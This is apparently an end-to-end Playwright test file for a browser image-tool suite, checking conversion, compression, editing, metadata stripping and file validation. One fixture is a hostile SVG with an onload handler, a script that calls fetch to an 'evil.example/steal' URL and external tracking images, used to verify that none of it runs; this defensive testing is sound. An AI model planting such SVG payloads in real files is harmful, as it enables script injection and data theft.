import { encodePng } from "../src/tools/pdf/core/png";
import { photoJpg, tinyJpg, withOrientation } from "../src/tools/pdf/core/fixtures";
import { sniff } from "../src/tools/image/core/formats";
import { jpegOrientation } from "../src/tools/pdf/core/images";
import { choose, expect, open, run, test, unzip, type FileSpec, type Page } from "./fixtures";

// Every image tool, end to end, on synthetic images. Outputs are decoded again
// in the browser to check format, dimensions, transparency and pixels. The
// shared guard proves nothing is uploaded, fetched from elsewhere or stored.

const file = (name: string, bytes: Uint8Array, mimeType = "application/octet-stream"): FileSpec => ({ name, mimeType, buffer: Buffer.from(bytes) });

/** 40 × 30: left half opaque blue, right half fully transparent. */
function twoTone(): Uint8Array {
  const px = new Uint8Array(40 * 30 * 4);
  for (let y = 0; y < 30; y++) for (let x = 0; x < 20; x++) px.set([0x25, 0x63, 0xeb, 255], (y * 40 + x) * 4);
  return encodePng(40, 30, 4, px);
}

/** A 1 × 1 GIF with two frames. */
function animatedGif(): Uint8Array {
  const frame = [0x21, 0xf9, 0x04, 0x00, 0x0a, 0x00, 0x00, 0x00, 0x2c, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0x02, 0x02, 0x44, 0x01, 0x00];
  return Uint8Array.from([..."GIF89a"].map((c) => c.charCodeAt(0)).concat([1, 0, 1, 0, 0x80, 0, 0, 255, 0, 0, 0, 0, 255], frame, frame, [0x3b]));
}

/** Scripts, event handlers and links to another site. None may run or load. */
const hostileSvg = `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="40" height="30" onload="alert(1)">
  <script>alert(2); fetch("https://evil.example/steal")</script>
  <image href="https://evil.example/track.png" width="10" height="10"/>
  <image xlink:href="https://evil.example/track2.png" x="10" width="10" height="10"/>
  <rect width="20" height="30" fill="#2563eb"/>
</svg>`;

/** Decode an output in the browser: size and RGBA at some points. */
async function decode(page: Page, bytes: Buffer, points: [number, number][] = []) {
  return page.evaluate(
    async ({ b64, points }) => {
      const bin = Uint8Array.from(atob(b64), (c) => c.charCodeAt(0));
      const bm = await createImageBitmap(new Blob([bin]));
      const c = document.createElement("canvas");
      c.width = bm.width;
      c.height = bm.height;
      const g = c.getContext("2d")!;
      g.drawImage(bm, 0, 0);
      return { width: bm.width, height: bm.height, px: points.map(([x, y]) => [...g.getImageData(x, y, 1, 1).data]) };
    },
    { b64: bytes.toString("base64"), points },
  );
}

/** A WebP made by this browser (Playwright's engines can all write WebP). */
async function webpOf(page: Page, png: Uint8Array): Promise<Uint8Array> {
  const b64 = await page.evaluate(async (src) => {
    const bm = await createImageBitmap(new Blob([Uint8Array.from(atob(src), (c) => c.charCodeAt(0))]));
    const c = document.createElement("canvas");
    c.width = bm.width;
    c.height = bm.height;
    c.getContext("2d")!.drawImage(bm, 0, 0);
    return c.toDataURL("image/webp", 1).split(",")[1];
  }, Buffer.from(png).toString("base64"));
  return Buffer.from(b64, "base64");
}

const close = (a: number[], b: number[], tol = 12) => a.every((v, i) => Math.abs(v - b[i]) <= tol);
const BLUE = [0x25, 0x63, 0xeb, 255];

test.describe("conversion", () => {
  test("keeps transparency in PNG and WebP, and warns before filling it for JPG", async ({ page }) => {
    await open(page, "png-to-webp", [file("logo.png", twoTone())]);
    const webp = await run(page, "Convert to WebP");
    expect(webp.name).toBe("logo.webp");
    expect(sniff(webp.bytes)).toBe("webp");
    const w = await decode(page, webp.bytes, [[5, 5], [35, 5]]);
    expect([w.width, w.height]).toEqual([40, 30]);
    expect(close(w.px[0], BLUE)).toBe(true);
    expect(w.px[1][3]).toBe(0);

    await open(page, "png-to-jpg", [file("logo.png", twoTone())]);
    await expect(page.getByRole("alert").filter({ hasText: "Transparency will be lost" })).toBeVisible();
    const jpg = await run(page, "Convert to JPG");
    expect(sniff(jpg.bytes)).toBe("jpeg");
    const j = await decode(page, jpg.bytes, [[35, 5]]);
    expect(close(j.px[0], [255, 255, 255, 255])).toBe(true);
  });

  test("JPG to PNG, WebP to JPG and WebP to PNG", async ({ page }) => {
    await open(page, "jpg-to-png", [file("photo.jpg", photoJpg())]);
    const png = await run(page, "Convert to PNG");
    expect(sniff(png.bytes)).toBe("png");
    expect(await decode(page, png.bytes)).toMatchObject({ width: 800, height: 500 });

    await page.goto("/");
    const webp = await webpOf(page, twoTone());
    await open(page, "webp-to-jpg", [file("pic.webp", webp)]);
    expect(sniff((await run(page, "Convert to JPG")).bytes)).toBe("jpeg");
    await open(page, "webp-to-png", [file("pic.webp", webp)]);
    const out = await run(page, "Convert to PNG");
    expect(sniff(out.bytes)).toBe("png");
    expect((await decode(page, out.bytes, [[35, 5]])).px[0][3]).toBe(0);

    await open(page, "jpg-to-webp", [file("photo.jpg", photoJpg())]);
    expect(sniff((await run(page, "Convert to WebP")).bytes)).toBe("webp");
  });

  test("warns that animation becomes one frame", async ({ page }) => {
    await open(page, "image-converter", [file("spin.gif", animatedGif())]);
    await expect(page.getByRole("alert").filter({ hasText: "Only the first frame is kept" })).toBeVisible();
    await choose(page, "Convert to", "PNG");
    const out = await run(page, "Convert to PNG");
    expect(sniff(out.bytes)).toBe("png");
    expect(await decode(page, out.bytes)).toMatchObject({ width: 1, height: 1 });
  });

  test("draws SVG safely: no scripts, no external loads, sharp at 2×", async ({ page }) => {
    page.on("dialog", () => {
      throw new Error("An SVG script ran");
    });
    await open(page, "image-converter", [file("icon.svg", new TextEncoder().encode(hostileSvg), "image/svg+xml")]);
    await choose(page, "Convert to", "PNG");
    await choose(page, "SVG size", "2× larger");
    const out = await run(page, "Convert to PNG");
    const d = await decode(page, out.bytes, [[10, 10], [70, 10]]);
    expect([d.width, d.height]).toEqual([80, 60]);
    expect(close(d.px[0], BLUE)).toBe(true);
    expect(d.px[1][3]).toBe(0);
  });

  test("batch conversion makes a ZIP with unique names", async ({ page }) => {
    await open(page, "batch-image-converter", [file("a.png", twoTone()), file("a.jpg", tinyJpg()), file("b.jpg", photoJpg())]);
    await choose(page, "Convert to", "PNG");
    const out = await run(page, "Convert 3 images to PNG");
    expect(out.name).toBe("privora-images.zip");
    const zip = unzip(out.bytes);
    expect(Object.keys(zip).sort()).toEqual(["a-2.png", "a.png", "b.png"]);
    for (const b of Object.values(zip)) expect(sniff(b)).toBe("png");
  });
});

test.describe("optimisation", () => {
  test("compresses a photo, and keeps an image that can't get smaller", async ({ page }) => {
    await open(page, "image-compressor", [file("photo.jpg", photoJpg())]);
    await choose(page, "Maximum size", /^800 pixels/);
    const out = await run(page, "Compress image");
    expect(out.name).toBe("photo-compressed.jpg");
    expect(out.bytes.length).toBeLessThan(photoJpg().length);
    expect(await decode(page, out.bytes)).toMatchObject({ width: 800, height: 500 });
    await expect(page.getByRole("slider", { name: /Comparison position/ })).toBeVisible();

    await open(page, "image-compressor", [file("tiny.png", twoTone())]);
    await expect(page.getByText("PNG is lossless")).toBeVisible();
    const png = await run(page, "Compress image");
    expect(sniff(png.bytes)).toBe("png");
    expect(png.bytes.length).toBeLessThanOrEqual(twoTone().length);
  });

  test("batch compression and batch resizing", async ({ page }) => {
    await open(page, "batch-image-compressor", [file("one.jpg", photoJpg()), file("two.jpg", photoJpg())]);
    await choose(page, "Maximum size", /^800 pixels/);
    const zip = unzip((await run(page, "Compress 2 images")).bytes);
    expect(Object.keys(zip).sort()).toEqual(["one-compressed.jpg", "two-compressed.jpg"]);

    await open(page, "batch-image-resizer", [file("one.jpg", photoJpg()), file("logo.png", twoTone())]);
    const sized = unzip((await run(page, "Resize 2 images")).bytes);
    expect(Object.keys(sized).sort()).toEqual(["logo-20x15.png", "one-400x250.jpg"]);
    expect(await decode(page, Buffer.from(sized["one-400x250.jpg"]))).toMatchObject({ width: 400, height: 250 });
  });

  test("resize, crop, rotate and flip", async ({ page }) => {
    await open(page, "image-resizer", [file("photo.jpg", photoJpg())]);
    await page.getByLabel("Width (px)").fill("200");
    await expect(page.getByLabel("Height (px)")).toHaveValue("125");
    expect(await decode(page, (await run(page, "Resize image")).bytes)).toMatchObject({ width: 200, height: 125 });

    await open(page, "image-cropper", [file("photo.jpg", photoJpg())]);
    await choose(page, "Aspect ratio", "Square (1:1)");
    await page.getByRole("group", { name: /Crop area/ }).press("ArrowLeft");
    expect(await decode(page, (await run(page, "Crop image")).bytes)).toMatchObject({ width: 500, height: 500 });

    await open(page, "image-rotator", [file("photo.jpg", photoJpg())]);
    expect(await decode(page, (await run(page, "Rotate image")).bytes)).toMatchObject({ width: 500, height: 800 });

    await open(page, "image-flipper", [file("logo.png", twoTone())]);
    const flipped = await decode(page, (await run(page, "Flip image")).bytes, [[5, 5], [35, 5]]);
    expect(flipped.px[0][3]).toBe(0);
    expect(close(flipped.px[1], BLUE)).toBe(true);
  });

  test("removes metadata without re-encoding and keeps photos upright", async ({ page }) => {
    const comment = Uint8Array.from([0xff, 0xfe, 0, 10, ...new TextEncoder().encode("SECRET!!")]);
    const tagged = withOrientation(photoJpg(), 6);
    const input = Uint8Array.from([...tagged.subarray(0, 2), ...comment, ...tagged.subarray(2)]);
    await open(page, "remove-image-metadata", [file("holiday.jpg", input)]);
    const out = await run(page, "Remove metadata");
    expect(out.name).toBe("holiday-clean.jpg");
    expect(out.bytes.includes(Buffer.from("SECRET!!"))).toBe(false);
    expect(jpegOrientation(out.bytes)).toBe(6);
    await expect(page.getByRole("region", { name: "Result" })).toContainText("no quality loss");
  });
});

test.describe("editing", () => {
  test("effects change pixels and keep the size", async ({ page }) => {
    const cases: [string, string, (px: number[]) => boolean][] = [
      ["grayscale-image", "Convert to grayscale", ([r, g, b]) => r === g && g === b],
      ["adjust-image-brightness", "Adjust brightness", ([r, , b]) => r > 0x25 + 20 && b === 255],
      ["adjust-image-contrast", "Adjust contrast", ([r, g, b, a]) => a === 255 && (r !== 0x25 || g !== 0x63 || b !== 0xeb)],
      ["adjust-image-saturation", "Adjust saturation", ([r, , b]) => b - r > 0xeb - 0x25],
      ["image-colour-adjustment", "Apply colour changes", ([, , , a]) => a === 255],
      ["blur-image", "Blur image", ([, , , a]) => a > 0 && a < 255],
      ["pixelate-image", "Pixelate image", ([, , , a]) => a >= 0],
      ["add-watermark-to-image", "Add watermark", ([, , , a]) => a >= 0],
    ];
    for (const [slug, action, ok] of cases) {
      await open(page, slug, [file("logo.png", twoTone())]);
      // Blur: sample next to the blue/transparent edge, where alpha must now be partial.
      const out = await decode(page, (await run(page, action)).bytes, [[slug === "blur-image" ? 20 : 5, 15]]);
      expect([out.width, out.height], slug).toEqual([40, 30]);
      expect(ok(out.px[0]), `${slug}: ${out.px[0]}`).toBe(true);
    }

    await open(page, "meme-generator", [file("photo.jpg", photoJpg())]);
    await page.getByLabel("Top text").fill("when the tests pass");
    expect(await decode(page, (await run(page, "Make meme")).bytes)).toMatchObject({ width: 800, height: 500 });
  });

  test("change settings and run again without choosing the file again", async ({ page }) => {
    await open(page, "adjust-image-brightness", [file("logo.png", twoTone())]);
    await run(page, "Adjust brightness");
    await page.getByRole("button", { name: "Change settings" }).click();
    await expect(page.getByRole("button", { name: "Adjust brightness" })).toBeVisible();
  });
});

test.describe("utilities", () => {
  test("information, metadata, colour picker and palette", async ({ page }) => {
    await open(page, "image-info", [file("photo.jpg", withOrientation(photoJpg(), 6))]);
    await expect(page.getByText("500 × 800 pixels")).toBeVisible();

    await open(page, "image-metadata-viewer", [file("photo.jpg", withOrientation(photoJpg(), 6))]);
    await expect(page.getByText("Orientation", { exact: true })).toBeVisible();

    await open(page, "image-colour-picker", [file("logo.png", twoTone())]);
    await expect(page.getByRole("button", { name: "Copy HEX" })).toBeVisible(); // image drawn
    const picker = page.getByRole("group", { name: /pick its colour/ });
    await picker.click({ position: { x: 5, y: 5 } });
    await expect(page.getByText("#2563eb")).toBeVisible();

    await open(page, "colour-palette-generator", [file("logo.png", twoTone())]);
    await page.getByRole("button", { name: "Generate palette" }).click();
    await expect(page.getByRole("list", { name: "Palette" })).toContainText("#2563eb");
  });

  test("Base64 round trip, and bad Base64 is refused", async ({ page }) => {
    await open(page, "image-to-base64", [file("logo.png", twoTone())]);
    const text = page.getByLabel(/Data URL/);
    await expect(text).toHaveValue(/^data:image\/png;base64,/);
    const dataUrl = await text.inputValue();

    await page.goto("/base64-to-image/");
    await page.getByLabel("Base64 or data URL").fill("this is not an image");
    await page.getByRole("button", { name: "Decode image" }).click();
    await expect(page.getByRole("alert")).toContainText("isn't a valid image");
    await page.getByLabel("Base64 or data URL").fill(dataUrl);
    const out = await run(page, "Decode image");
    expect(out.name).toBe("image.png");
    expect(new Uint8Array(out.bytes)).toEqual(twoTone());
  });

  test("favicons and comparison", async ({ page }) => {
    await open(page, "favicon-generator", [file("logo.png", twoTone())]);
    await expect(page.getByText(/isn't square/)).toBeVisible();
    const zip = unzip((await run(page, "Create favicons")).bytes);
    expect(Object.keys(zip).sort()).toEqual([
      "android-chrome-192x192.png", "android-chrome-512x512.png", "apple-touch-icon.png", "favicon-16x16.png", "favicon-32x32.png", "favicon.ico",
    ]);
    expect(sniff(zip["favicon.ico"])).toBe("ico");
    expect(await decode(page, Buffer.from(zip["android-chrome-512x512.png"]))).toMatchObject({ width: 512, height: 512 });

    await open(page, "image-comparison", [file("a.png", twoTone()), file("b.jpg", photoJpg())]);
    await page.getByRole("button", { name: "Compare images" }).click();
    await expect(page.getByRole("slider", { name: /Comparison position/ })).toBeVisible();
    await expect(page.getByRole("region", { name: "Result" })).toContainText("different sizes");
  });
});

test.describe("validation", () => {
  test("rejects damaged and disguised files when they are chosen", async ({ page }) => {
    await page.goto("/image-compressor/");
    await page.locator('input[type="file"]').first().setInputFiles([file("broken.jpg", new TextEncoder().encode("definitely not a jpeg"))]);
    await expect(page.getByRole("alert")).toContainText("could not be opened");
    await page.locator('input[type="file"]').first().setInputFiles([file("notes.txt", new TextEncoder().encode("hi"), "text/plain")]);
    await expect(page.getByRole("alert")).toContainText("Unsupported file type");
  });
});
